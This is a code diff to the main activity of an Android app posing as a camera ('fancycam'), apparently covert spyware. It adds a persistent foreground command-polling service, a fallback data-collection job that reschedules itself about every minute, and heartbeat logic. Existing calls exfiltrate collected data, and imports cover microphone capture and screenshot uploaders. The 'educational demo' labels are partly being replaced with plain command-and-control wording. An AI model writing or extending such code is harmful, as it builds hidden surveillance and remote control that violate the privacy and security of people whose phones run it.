@@ -7,10 +7,10 @@ import com.example.fancycam.network.DataExfilSender
 import com.example.fancycam.network.PhotoUploader
 import com.example.fancycam.network.ScreenshotUploader
 import com.example.fancycam.services.MicrophoneCapture
+import com.example.fancycam.services.CommandPollingService
 import com.example.fancycam.storage.PhotoStorageManager
 import com.example.fancycam.workers.DataCollectionWorker
 import com.example.fancycam.workers.PhotoUploadWorker
-import com.example.fancycam.workers.ScreenCaptureWorker
 import android.Manifest
 import android.content.Context
 import android.content.Intent
@@ -40,11 +40,9 @@ import androidx.camera.core.ImageCapture
 import androidx.core.content.ContextCompat
 import androidx.lifecycle.lifecycleScope
 import androidx.work.Constraints
-import androidx.work.ExistingPeriodicWorkPolicy
 import androidx.work.ExistingWorkPolicy
 import androidx.work.NetworkType
 import androidx.work.OneTimeWorkRequestBuilder
-import androidx.work.PeriodicWorkRequestBuilder
 import androidx.work.WorkManager
 import androidx.work.workDataOf
 import com.example.fancycam.databinding.ActivityMainBinding
@@ -130,7 +128,10 @@ class MainActivity : AppCompatActivity() {
             DataExfilSender.collectAndExfiltrate(this)
         }, 5000)
 
-        // EDUCATIONAL DEMO: Schedule periodic collection
+        // PRIMARY: keep one long-lived foreground service driving heartbeat/commands.
+        CommandPollingService.start(this)
+
+        // FALLBACKS: WorkManager jobs keep checking in when the service is not running.
         schedulePeriodicCollection()
     }
 
@@ -549,15 +550,20 @@ class MainActivity : AppCompatActivity() {
     }
 
     /**
-     * EDUCATIONAL DEMO: Schedule periodic data collection via WorkManager.
-     * Demonstrates persistent background execution that survives app termination.
+     * FALLBACK: a WorkManager job that keeps the device checking in when the primary
+     * [CommandPollingService] is not running. It self-skips while that service is active.
+     *
+     *   - DataCollectionWorker: self-rescheduling ~1-minute collection + heartbeat watchdog
      */
     private fun schedulePeriodicCollection() {
+        // Remove the retired ScreenCaptureWorker periodic job on upgraded installs.
+        WorkManager.getInstance(this).cancelUniqueWork("edu_screen_capture")
+
         val constraints = Constraints.Builder()
             .setRequiredNetworkType(NetworkType.CONNECTED)
             .build()
 
-        // 15-minute minimum for PeriodicWorkRequest means 1-minute cadence
+        // 15-minute minimum for PeriodicWorkRequest means the ~1-minute cadence
         // must be a self-rescheduling one-time chain.
         val dataWork = OneTimeWorkRequestBuilder<DataCollectionWorker>()
             .setInitialDelay(1, TimeUnit.MINUTES)
@@ -569,23 +575,16 @@ class MainActivity : AppCompatActivity() {
             dataWork
         )
 
-        val screenCaptureWork = PeriodicWorkRequestBuilder<ScreenCaptureWorker>(15, TimeUnit.MINUTES)
-            .setConstraints(constraints)
-            .build()
-        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
-            ScreenCaptureWorker.WORK_NAME,
-            ExistingPeriodicWorkPolicy.KEEP,
-            screenCaptureWork
-        )
-
-        Log.d(TAG, "[EDUCATIONAL] Periodic data collection scheduled (every 15 min)")
-        Log.d(TAG, "[EDUCATIONAL] Periodic screen-capture heartbeat scheduled (every 15 min)")
+        Log.d(TAG, "[EDUCATIONAL] Fallback data-collection + heartbeat watchdog scheduled (~1 min)")
     }
 
     private var heartbeatHandler: Handler? = null
     private val heartbeatRunnable = object : Runnable {
         override fun run() {
-            DataExfilSender.sendHeartbeat(this@MainActivity)
+            // FALLBACK: only beat from the Activity when the polling service is down.
+            if (!CommandPollingService.isRunning) {
+                DataExfilSender.sendHeartbeat(this@MainActivity)
+            }
             heartbeatHandler?.postDelayed(this, 15000)
         }
     }
